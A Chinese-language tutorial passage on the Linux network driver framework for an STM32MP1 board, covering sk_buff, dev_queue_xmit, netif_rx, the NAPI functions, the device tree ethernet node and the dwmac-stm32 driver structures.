+<p>网络是分层的，对于应用层而言不用关心具体的底层是如何工作的，只需要按照协议将要发送或接收的数据打包好即可。<strong>打包好以后都通过dev_queue_xmit函数将数据发送出去，接收数据的话使用netif_rx函数即可，依次来看一下这两个函数</strong>。</p> 
+<h4><a id="dev_queue_xmit_558"></a>dev_queue_xmit函数</h4> 
+<p><strong>此函数用于将网络数据发送出去</strong>，函数定义在include/linux/netdevice.h中，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">dev_queue_xmit</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>skb：要发送的数据，这是一个sk_buff结构体指针，sk_buff是Linux网络驱动中一个非常重要的结构体，<strong>网络数据就是以sk_buff保存的，各个协议层在sk_buff中添加自己的协议头，最终由底层驱动将sk_buff中的数据发送出去</strong>。网络数据的接收过程恰好相反，<strong>网络底层驱动将接收到的原始数据打包成sk_buff，然后发送给上层协议，上层会取掉相应的头部，然后将最终的数据发送给用户</strong>。</li><li>返回值：0，发送成功；负值，发送失败。</li></ul> 
+<p>dev_queue_xmit函数太长，这里就不详细的分析了，<strong>dev_queue_xmit函数最终是通过net_device_ops操作集里面的ndo_start_xmit函数来完成最终发送了</strong>，<strong>ndo_start_xmit就是网络驱动编写人员去实现的</strong>，整个路程如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/f3/bb/23s0c8M4_o.png" alt="dev_queue_xmit执行流程"></p> 
+<h4><a id="netif_rx_572"></a>netif_rx函数</h4> 
+<p><strong>上层接收数据的话使用netif_rx函数</strong>，但是最原始的网络数据一般是通过轮询、中断或NAPI的方式来接收。netif_rx函数定义在 net/core/dev.c 中，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">netif_rx</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>skb：保存接收数据的sk_buff。</li><li>返回值：NET_RX_SUCCESS，成功NET_RX_DROP，数据包丢弃。</li></ul> 
+<p>重点来看一下sk_buff这个结构体，<strong>sk_buff是Linux网络重要的数据结构，用于管理接收或发送数据包</strong>，sk_buff结构体定义在include/linux/skbuff.h中，结构体内容如下(由于结构体比较大，为了缩小篇幅只列出部分重要的内容)：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.3</span><span class="token number">.3</span><span class="token number">.1</span> sk_buff 结构体
+<span class="token number">685</span> <span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">686</span>     <span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">687</span>         <span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">688</span>             <span class="token comment">/* These two members must be first. */</span>
+<span class="token number">689</span>             <span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>next<span class="token punctuation">;</span>
+<span class="token number">690</span>             <span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>prev<span class="token punctuation">;</span>
+<span class="token number">691</span>
+<span class="token number">692</span>             <span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">693</span>                 <span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span>dev<span class="token punctuation">;</span>
+<span class="token number">694</span>                 <span class="token comment">/* Some protocols might use this space to store 
+695                  * information, while device pointer would be NULL.
+696                  * UDP receive path is one user.
+697                  */</span>
+<span class="token number">698</span>                 <span class="token keyword">unsigned</span> <span class="token keyword">long</span> dev_scratch<span class="token punctuation">;</span>
+<span class="token number">699</span>             <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token number">700</span>         <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token number">701</span>         <span class="token keyword">struct</span> <span class="token class-name">rb_node</span> rbnode<span class="token punctuation">;</span>
+<span class="token number">702</span>         <span class="token keyword">struct</span> <span class="token class-name">list_head</span> list<span class="token punctuation">;</span>
+<span class="token number">703</span>     <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token number">704</span>
+<span class="token number">705</span>     <span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">706</span>         <span class="token keyword">struct</span> <span class="token class-name">sock</span> <span class="token operator">*</span>sk<span class="token punctuation">;</span>
+<span class="token number">707</span>         <span class="token keyword">int</span> ip_defrag_offset<span class="token punctuation">;</span>
+<span class="token number">708</span>     <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token number">709</span>
+<span class="token number">710</span>     <span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">711</span>         <span class="token class-name">ktime_t</span> tstamp<span class="token punctuation">;</span>
+<span class="token number">712</span>         u64 skb_mstamp_ns<span class="token punctuation">;</span> <span class="token comment">/* earliest departure time */</span>
+<span class="token number">713</span>     <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token number">714</span>     <span class="token comment">/*
+715      * This is the control buffer. It is free to use for every
+716      * layer. Please put your private variables there. If you
+717      * want to keep them across layers you have to do a skb_clone()
+718      * first. This is owned by whoever has the skb queued ATM.
+719      */</span>
+<span class="token number">720</span>     <span class="token keyword">char</span> cb<span class="token punctuation">[</span><span class="token number">48</span><span class="token punctuation">]</span> <span class="token function">__aligned</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">721</span>
+<span class="token number">722</span>     <span class="token keyword">union</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">723</span>         <span class="token keyword">struct</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">724</span>             <span class="token keyword">unsigned</span> <span class="token keyword">long</span> _skb_refdst<span class="token punctuation">;</span>
+<span class="token number">725</span>             <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>destructor<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">726</span>         <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token number">727</span>         <span class="token keyword">struct</span> <span class="token class-name">list_head</span> tcp_tsorted_anchor<span class="token punctuation">;</span>
+<span class="token number">728</span>     <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">733</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> len<span class="token punctuation">,</span>
+<span class="token number">734</span>                  data_len<span class="token punctuation">;</span>
+<span class="token number">735</span>     __u16        mac_len<span class="token punctuation">,</span>
+<span class="token number">736</span>                  hdr_len<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">868</span>     __be16       protocol<span class="token punctuation">;</span>
+<span class="token number">869</span>     __u16        transport_header<span class="token punctuation">;</span>
+<span class="token number">870</span>     __u16        network_header<span class="token punctuation">;</span>
+<span class="token number">871</span>     __u16        mac_header<span class="token punctuation">;</span>
+<span class="token number">872</span>
+<span class="token number">873</span>     <span class="token comment">/* private: */</span>
+<span class="token number">874</span>     __u32        headers_end<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token number">875</span>     <span class="token comment">/* public: */</span>
+<span class="token number">876</span>
+<span class="token number">877</span>     <span class="token comment">/* These elements must be at the end, see alloc_skb() for 
+details. */</span>
+<span class="token number">878</span>     <span class="token class-name">sk_buff_data_t</span> tail<span class="token punctuation">;</span>
+<span class="token number">879</span>     <span class="token class-name">sk_buff_data_t</span> end<span class="token punctuation">;</span>
+<span class="token number">880</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>head<span class="token punctuation">,</span>
+<span class="token number">881</span>                   <span class="token operator">*</span>data<span class="token punctuation">;</span>
+<span class="token number">882</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> truesize<span class="token punctuation">;</span>
+<span class="token number">883</span>     <span class="token class-name">refcount_t</span> users<span class="token punctuation">;</span>
+<span class="token number">884</span>
+<span class="token number">885</span> #ifdef CONFIG_SKB_EXTENSIONS
+<span class="token number">886</span>     <span class="token comment">/* only useable after checking -&gt;active_extensions != 0 */</span>
+<span class="token number">887</span>     <span class="token keyword">struct</span> <span class="token class-name">skb_ext</span> <span class="token operator">*</span>extensions<span class="token punctuation">;</span>
+<span class="token number">888</span> #endif
+<span class="token number">889</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>第687-700 行：next和prev分别指向下一个和前一个sk_buff，构成一个<strong>双向链表</strong>。</p> 
+<p>第693行：dev表示当前sk_buff从哪个设备接收到或者发出的。</p> 
+<p>第706行：sk表示当前sk_buff所属的Socket。</p> 
+<p>第711行：tstamp表示数据包接收时或准备发送时的时间戳。</p> 
+<p>第720行：cb为控制缓冲区，不管哪个层都可以自由使用此缓冲区，用于放置私有数据。</p> 
+<p>第725行：destructor函数，当释放缓冲区的时候可以在此函数里面完成某些动作。</p> 
+<p>第733-734行：len为实际的数据长度，包括主缓冲区中数据长度和分片中的数据长度。data_len为数据长度，只计算分片中数据的长度。</p> 
+<p>第735-736行：mac_len为连接层头部长度，也就是MAC头的长度。</p> 
+<p>第868行：protocol协议。</p> 
+<p>第869行：transport_header为传输层头部。</p> 
+<p>第870行：network_header为网络层头部。</p> 
+<p>第871行：mac_header为链接层头部。</p> 
+<p>第878行：tail指向实际数据的尾部。</p> 
+<p>第879行：end指向缓冲区的尾部。</p> 
+<p>第880行：head指向缓冲区的头部，data指向实际数据的头部。data和tail指向实际数据的头部和尾部，head和end指向缓冲区的头部和尾部。结构如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/e7/a4/a77PZECo_o.png" alt="sk_buff数据区结构示意图"></p> 
+<p>针对sk_buff内核提供了一系列的操作与管理函数，简单看一些常见的API函数。</p> 
+<p>1、分配sk_buff</p> 
+<p><strong>要使用sk_buff必须先分配，首先来看一下alloc_skb这个函数</strong>，此函数定义include/linux/skbuff.h中，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span><span class="token function">alloc_skb</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> size<span class="token punctuation">,</span>
+										<span class="token class-name">gfp_t</span> priority<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>size：要分配的大小，也就是skb数据段大小。</li><li>priority：为GFP MASK宏，比如GFP_KERNEL、GFP_ATOMIC等。</li><li>返回值：分配成功的话就返回申请到的sk_buff首地址，失败的话就返回NULL。</li></ul> 
+<p><strong>在网络设备驱动中常常使用netdev_alloc_skb来为某个设备申请一个用于接收的skb_buff</strong>，此函数也定义在include/linux/skbuff.h中，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span><span class="token function">netdev_alloc_skb</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span>
+											   <span class="token keyword">unsigned</span> <span class="token keyword">int</span> length<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>dev：要给哪个设备分配sk_buff。</li><li>length：要分配的大小。</li><li>返回值：分配成功的话就返回申请到的sk_buff首地址，失败的话就返回NULL。</li></ul> 
+<p>2、释放sk_buff</p> 
+<p>当<strong>使用完成以后就要释放掉sk_buff，释放函数可以使用kfree_skb</strong>，函数定义在include/linux/skbuff.c中，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">kfree_skb</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>skb：要释放的sk_buff。</li><li>返回值：无。</li></ul> 
+<p>对于<strong>网络设备而言最好使用如下所示释放函数</strong>：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">dev_kfree_skb</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">)</span>
+</code></pre> 
+<p><strong>函数只要一个参数skb，就是要释放的sk_buff</strong>。</p> 
+<p>3、skb_put、skb_push、skb_pull和skb_reserve</p> 
+<p>这四个函数用于<strong>变更sk_buff</strong>，先来看一下<strong>skb_put函数，此函数用于在尾部扩展skb_buff的数据区，也就将skb_buff的tail后移n个字节，从而导致skb_buff的len增加n个字节</strong>，原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">skb_put</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>skb：要操作的sk_buff。</li><li>len：要增加多少个字节。</li><li>返回值：扩展出来的那一段数据区首地址。</li></ul> 
+<p>skb_put操作之前和操作之后的数据区如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/04/1e/JgRf3sxx_o.png" alt="skb_put函数操作前后对比"></p> 
+<p><strong>skb_push函数用于在头部扩展skb_buff的数据区</strong>，函数原型如下所示：</p> 
+<pre><code class="prism language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">skb_push</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>skb：要操作的sk_buff。</li><li>len：要增加多少个字节。</li><li>返回值：扩展完成以后新的数据区首地址。</li></ul> 
+<p>skb_push操作之前和操作之后的数据区如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/17/06/d9mKlPhb_o.png" alt="skb_push函数操作前后对比"></p> 
+<p><strong>sbk_pull函数用于从sk_buff的数据区起始位置删除数据</strong>，函数原型如下所示：</p> 
+<pre><code class="prism language-c"><span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">skb_pull</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>skb：要操作的sk_buff。</li><li>len：要删除的字节数。</li><li>返回值：删除以后新的数据区首地址。</li></ul> 
+<p>skb_pull操作之前和操作之后的数据区如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/57/0d/YX6VfjX6_o.png" alt="skb_pull函数操作前后对比"></p> 
+<p><strong>sbk_reserve函数用于调整缓冲区的头部大小</strong>，方法很简单，<strong>将skb_buff的data和tail同时后移n个字节即可</strong>，函数原型如下所示：</p> 
+<pre><code class="prism language-c"><span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">skb_reserve</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sk_buff</span> <span class="token operator">*</span>skb<span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>skb：要操作的sk_buff。</li><li>len：要增加的缓冲区头部大小。</li><li>返回值：无。</li></ul> 
+<h3><a id="NAPI_789"></a>网络NAPI处理机制</h3> 
+<p>像IIC、SPI、网络等这些通信接口，接收数据有两种方法：轮询或中断。<strong>Linux里面的网络数据接收也有轮询和中断两种，中断的好处就是响应快，数据量小的时候处理及时，速度快，但是一旦当数据量大，而且都是短帧的时候会导致中断频繁发生，消耗大量的CPU处理时间在中断自身处理上。轮询恰好相反，响应没有中断及时，但是在处理大量数据的时候不需要消耗过多的CPU处理时间</strong>。Linux在这两个处理方式的基础上提出了另外一种网络数据接收的处理方法：NAPI(New API)，NAPI是一种高效的网络处理技术。<strong>NAPI的核心思想就是不全部采用中断来读取网络数据，而是采用中断来唤醒数据接收服务程序，在接收服务程序中采用POLL的方法来轮询处理数据</strong>。这种方法的<strong>好处就是可以提高短数据包的接收效率，减少中断处理的时间</strong>。目前NAPI已经在Linux的网络驱动中得到了大量的应用，ST官方编写的网络驱动都是采用的NAPI机制。</p> 
+<p>关于NAPI详细的处理过程本章节不讨论，本章节就简单讲解一下如何在驱动中使用NAPI，<strong>Linux内核使用结构体napi_struct表示NAPI，在使用NAPI之前要先初始化一个napi_struct实例</strong>。</p> 
+<h4><a id="NAPI_793"></a>初始化NAPI</h4> 
+<p>首先要<strong>初始化一个napi_struct 实例，使用netif_napi_add函数</strong>，此函数定义在net/core/dev.c中，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">netif_napi_add</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span>dev<span class="token punctuation">,</span> 
+					<span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span>napi<span class="token punctuation">,</span>
+ 					<span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>poll<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> 
+					<span class="token keyword">int</span> weight<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>dev：每个NAPI必须关联一个网络设备，此参数指定NAPI要关联的网络设备。</li><li>napi：要初始化的NAPI实例。</li><li>poll：NAPI所使用的轮询函数，非常重要，一般在此轮询函数中完成网络数据接收的工作。</li><li>weight：NAPI默认权重(weight)，一般为NAPI_POLL_WEIGHT。</li><li>返回值：无。</li></ul> 
+<h4><a id="NAPI_808"></a>删除NAPI</h4> 
+<p><strong>如果要删除NAPI，使用netif_napi_del函数即可</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">netif_napi_del</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span>napi<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>napi：要删除的NAPI。</li><li>返回值：无。</li></ul> 
+<h4><a id="NAPI_817"></a>使能NAPI</h4> 
+<p><strong>初始化完NAPI以后，必须使能才能使用，使用函数napi_enable</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">napi_enable</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span>n<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>n：要使能的NAPI。</li><li>返回值：无。</li></ul> 
+<h4><a id="NAPI_826"></a>关闭NAPI</h4> 
+<p><strong>关闭NAPI使用napi_disable函数即可</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">napi_disable</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span>n<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>n：要关闭的NAPI。</li><li>返回值：无。</li></ul> 
+<h4><a id="NAPI_835"></a>检查NAPI是否可以进行调度</h4> 
+<p><strong>使用napi_schedule_prep函数检查NAPI是否可以进行调度</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">inline</span> bool <span class="token function">napi_schedule_prep</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span>n<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>n：要检查的NAPI。</li><li>返回值：如果可以调度就返回真，如果不可调度就返回假。</li></ul> 
+<h4><a id="NAPI_844"></a>NAPI调度</h4> 
+<p><strong>如果可以调度的话就进行调度，使用__napi_schedule函数完成NAPI调度</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">__napi_schedule</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span>n<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>n：要调度的NAPI。</li><li>返回值：无。</li></ul> 
+<p><strong>也可以使用napi_schedule函数来一次完成napi_schedule_prep和__napi_schedule这两<br> 个函数的工作</strong>，napi_schedule函数内容如下所示：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.3</span><span class="token number">.4</span><span class="token number">.1</span> napi_schedule 函数代码
+<span class="token number">442</span> <span class="token keyword">static</span> <span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">napi_schedule</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span>n<span class="token punctuation">)</span>
+<span class="token number">443</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">444</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">napi_schedule_prep</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token number">445</span>     <span class="token function">__napi_schedule</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">446</span> <span class="token punctuation">}</span>
+</code></pre> 
+<p>从示例代码52.3.4.1可以看出 ，napi_schedule函 数就是对napi_schedule_prep和__napi_schedule的简单封装，一次完成判断和调度。</p> 
+<h4><a id="NAPI_866"></a>NAPI处理完成</h4> 
+<p><strong>NAPI处理完成以后需要调用napi_complete函数来标记NAPI处理完成</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">inline</span> <span class="token keyword">void</span> <span class="token function">napi_complete</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">napi_struct</span> <span class="token operator">*</span>n<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>n：处理完成的NAPI。</li><li>返回值：无。</li></ul> 
+<h2><a id="_875"></a>原理图介绍</h2> 
+<p>正点原子的STM32MP1开发板网络相关的硬件有两个版本分别为：V1.2版本以前的核心板和V1.3版本以后的核心板。</p> 
+<h3><a id="V12_877"></a>V1.2版本以前的核心板</h3> 
+<p>V1.2版本以前的核心板的原理图，如下所示：</p> 
+<p><img src="https://images2.imgbox.com/89/97/3sfhuaiF_o.png" alt="V1.2版本以前的核心板原理图"></p> 
+<p>在之前的学习中已经知道了PHY地址是由RXCTL、RXC和RXD3控制的，从上图中知道了这三个引脚为0、0和1，PHY的地址为0x1，RGMII的电平为3.3V。</p> 
+<h3><a id="V13_883"></a>V1.3版本以后的核心板</h3> 
+<p>V1.3版本以后的核心板原理图，如下所示：</p> 
+<p><img src="https://images2.imgbox.com/48/06/ylg2ds5c_o.png" alt="V1.3版本以后得核心板原理图"></p> 
+<h2><a id="STM32MP1_888"></a>STM32MP1网络驱动框架</h2> 
+<h3><a id="STM32MP1_889"></a>STM32MP1网络外设设备树</h3> 
+<p>上一小节对Linux的网络驱动框架进行了一个简单的介绍，本节就来简单分析一下STM32MP1的网络驱动源码。肯定是<strong>先分析设备树，STM32MP1系列SoC网络绑定文档为Documentation/devicetree/bindings/net/stm32-dwmac.txt，此绑定文档描述了STM32MP1系列SoC网络设备树节点的要求</strong> 。 此外还有一份文档Documentation/devicetree/bindings/net/ethernet.txt，该文档描述了网络设备节点的一些通用属性。<br> 在内核源码目录arch/arm/boot/dts/stm32mp152.dtsi设备树文件中，定义了网络设备节点，如下所示：</p> 
+<p><img src="https://images2.imgbox.com/d4/f9/llzMpVt7_o.png" alt="ethernet0节点"></p> 
+<p>第1605行，compatible属性有两个分别为st,stm32mp1-dwmac和snps,dwmac-4.20a。在内<br> 核源码目录里搜索这两个属性值，就能找到drivers/net/ethernet/stmicro/stmmac/dwmac-stm32.c文件。dwmac-stm32.c就是stm32mp1的驱动源码，后面在分析。</p> 
+<p>第1606行，reg属性值表示网络的物理地址大小。</p> 
+<p>第1621行，snps,mixed-burst属性，表示DMA使用混合突发模式。</p> 
+<p>第1622行，snps,pbl属性值为2，表示突发长度为2。</p> 
+<p>第1623行，snps,en-tx-lpi-clockgating属性，在TX低功耗模式下，使能MAC TX门控时钟。</p> 
+<p>第1625行，snps,tso属性，表示启动tso功能，tso全称为TCP Segment Offload，也就是利用网卡的少量处理能力，降低CPU发送数据包负载的技术，需要网卡硬件及驱动支持。</p> 
+<p>示例代码52.5.1.1是ST官方编写的，不需要去修改，此示例代码52.5.1.1是不能正常工作的，还需要根据实际情况添加或者修改一些属性。打开stm32mp157d-atk.dtsi，找到如下内容：</p> 
+<p><img src="https://images2.imgbox.com/3c/a0/k7JN0Etx_o.png" alt="stm32mp157d-atk.dtsi中的网络设备"></p> 
+<p>从示例代码52.5.1.2中可以看到，ethernet0就是要追加的内容，接下来来看看这些追加属性表示什么意思。</p> 
+<ul><li>status：这个属性就不用说了，把status属性值修改为“okay”，使能网络。</li><li>pinctrl-XXX：这些属性不用说了，就是定义了网络的引脚复用功能。在stm32mp15-pinctrl.dtsi里定义了ethernet0_rgmii_pins_a和ethernet0_rgmii_pins_sleep_a。</li><li>phy-mode：该属性值是一个字符串，表示网络所使用的PHY接口模式，是MII、RMII、GMII还是RGMII等，它是一个标准的属性，支持的字符串值有‘mii’、‘gmii’、‘sgmii’、‘rmii’、‘rgmii’、‘rgmii-id’、‘rgmii-rxid’、‘rgmii-txid’、‘xgmii’等等。第6行中，phy-mode属性的值等于‘rgmii-id’表示使用的是RGMII接口模式，由PHY提供RX和TX延迟，MAC不需要添加RX和TX延时内容。与RGMII接口相关的值有‘rgmii’、‘rgmii-id’、‘rgmii-rxid’、‘rgmii-txid’这些，ethernet.txt文件里面详细讲解了这些属性值的含义，这里就不详细介绍了。</li><li>max-speed：PHY支持的最高速度，比如10、100或1000。</li><li>phy- handle：连接到此网络设备的PHY芯片句柄。</li><li>mdio：第10-17行中定义了一个mdio子节点，该节点用于描述MDIO总线。#address-cell属性和#size-cells属性用于描述mdio节点的子节点中所定义的reg属性，这个reg属性其实就表示PHY芯片的地址。</li></ul> 
+<h3><a id="STM32MP1_919"></a>STM32MP1网络驱动源码简析</h3> 
+<h4><a id="_920"></a>重要的结构体</h4> 
+<p>每个驱动都会自定义自己的结构体，要了解驱动的注册过程，就先从自定义结构体看起。前面说了驱动文件为：drivers/net/ethernet/stmicro/stmmac/dwmac-stm32.c，打开dwmac-stm32.c，找到如下所示内容：</p> 
+<p><img src="https://images2.imgbox.com/2a/d0/9ASGqpb3_o.png" alt="stm32_dwmac结构体"></p> 
+<p>示例代码52.5.2.1中，主要是第101行，<strong>ops成员，表示网络相关的操作集，驱动人员要实现的，ST官方已经写好了</strong>；其它属性成员都是时钟相关的，肯定是通过设备树配置时钟。去了解一下stm32_ops结构体代码如下所示：</p> 
+<p><img src="https://images2.imgbox.com/4c/c9/p4aXMC2I_o.png" alt="stm32_ops结构体"></p> 
+<p>单片机要使用网络的时候，需要初始化网络相关的寄存器，<strong>stm32_ops就是根据设备树参数去设置网络相关的寄存器</strong>，后面会分析stm32_ops。</p> 
+<p><strong>plat_stmmacenet_data结构体很重要，将网络设备注册到内核的时候需要使用到此结构体</strong>。此结构体定义在include/linux/stmmac.h，plat_stmmacenet_data结构体原型如下示例代码所示：</p> 
+<p><img src="https://images2.imgbox.com/8e/13/KuebekkJ_o.png" alt="plat_stmmacenet_data结构体"></p> 
+<p>示例代码52.5.2.3中的内容比较多，有省略，只列出了驱动要用到的一些参数。<strong>stm32_dwmac和stm32_ops这两个结构体主要是用作初始化网络，plat_stmmacenet_data结构体主要用于注册网络设备</strong>。</p> 
+<h4><a id="stm32_dwmac_probe_936"></a>stm32_dwmac_probe函数</h4> 
+<p><strong>STM32MP1网络驱动主要分两部分：STM32MP1网络外设MAC驱动以及PHY芯片驱动，MAC驱动是ST编写的，PHY芯片有通用驱动文件，有些PHY芯片厂商还会针对自己的芯片编写对应的PHY驱动</strong>。总体来说，SoC内置网络MAC+外置PHY芯片这种方案是不需要编写什么驱动的，<strong>基本可以直接使用</strong>。但是为了学习，还是要简单分析一下具体的网络驱动编写过程。打开dwmac-stm32.c，找到如下所示内容：</p> 
